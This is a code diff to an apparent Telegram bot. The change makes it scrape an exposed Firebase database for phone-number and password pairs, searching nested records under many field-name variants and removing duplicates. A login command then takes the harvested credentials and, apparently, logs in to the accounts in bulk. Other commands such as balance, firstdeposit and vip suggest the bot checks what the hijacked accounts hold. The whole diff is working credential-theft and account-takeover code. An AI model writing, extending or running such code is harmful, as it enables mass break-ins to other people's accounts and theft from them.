@@ -221,8 +221,42 @@ def fetch_firebase(url):
 
             last_key = list(data.keys())[-1]
 
-        logger.info("TOTAL FETCHED: " + str(len(all_data)) + " accounts")
-        return all_data if all_data else None
+        logger.info("TOTAL RAW FETCHED: " + str(len(all_data)) + " items")
+        
+        extracted_users = []
+        
+        def smart_extract(obj):
+            if isinstance(obj, dict):
+                phone = (
+                    obj.get("phone") or obj.get("number") or obj.get("mobile") 
+                    or obj.get("userNumber") or obj.get("username") or obj.get("phonenumber")
+                    or obj.get("Num") or obj.get("num")
+                )
+                pwd = (
+                    obj.get("password") or obj.get("pass") or obj.get("pwd") 
+                    or obj.get("passWord") or obj.get("loginPassword") or obj.get("Pass")
+                )
+                
+                if phone and pwd:
+                    extracted_users.append({"phone": str(phone).strip(), "password": str(pwd).strip()})
+                else:
+                    for k, v in obj.items():
+                        if isinstance(v, (dict, list)):
+                            smart_extract(v)
+            elif isinstance(obj, list):
+                for item in obj:
+                    if isinstance(item, (dict, list)):
+                        smart_extract(item)
+
+        smart_extract(all_data)
+        
+        unique_users = {}
+        for u in extracted_users:
+            unique_users[u["phone"]] = u
+            
+        final_list = list(unique_users.values())
+        logger.info("PARSED VALID ACCOUNTS: " + str(len(final_list)))
+        return final_list if final_list else None
 
     except Exception as e:
         logger.error("Firebase error: " + str(e))
@@ -1226,24 +1260,11 @@ async def login_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Set Firebase URL first!\n/setfirebase <url>")
         return
 
-    await update.message.reply_text("🔄 Fetching data...")
+    await update.message.reply_text("🔄 Smart fetching and parsing Firebase data...")
 
-    data = fetch_firebase(firebase_url)
-    if not data:
-        await update.message.reply_text("❌ Failed to fetch data! Check URL.")
-        return
-
-    users = []
-    if isinstance(data, dict):
-        for key, value in data.items():
-            if isinstance(value, dict):
-                phone = value.get("phone") or value.get("number") or key
-                pwd = value.get("password") or value.get("pass")
-                if phone and pwd:
-                    users.append({"phone": str(phone), "password": str(pwd)})
-
-    if not users:
-        await update.message.reply_text("⚠️ No credentials found!")
+    users = fetch_firebase(firebase_url)
+    if not users or not isinstance(users, list):
+        await update.message.reply_text("⚠️ No valid credentials found! Check your Firebase database structure.")
         return
 
     total = len(users)
@@ -1595,7 +1616,7 @@ def main():
     app.add_handler(CommandHandler("login", login_cmd))
     app.add_handler(CommandHandler("stop", stop_cmd))
     app.add_handler(CommandHandler("status", status_cmd))
-    app.add_handler(CommandHandler(("success"), success_cmd))
+    app.add_handler(CommandHandler("success", success_cmd))
     app.add_handler(CommandHandler("balance", balance_cmd))
     app.add_handler(CommandHandler("firstdeposit", firstdeposit_cmd))
     app.add_handler(CommandHandler("vip", vip_cmd))
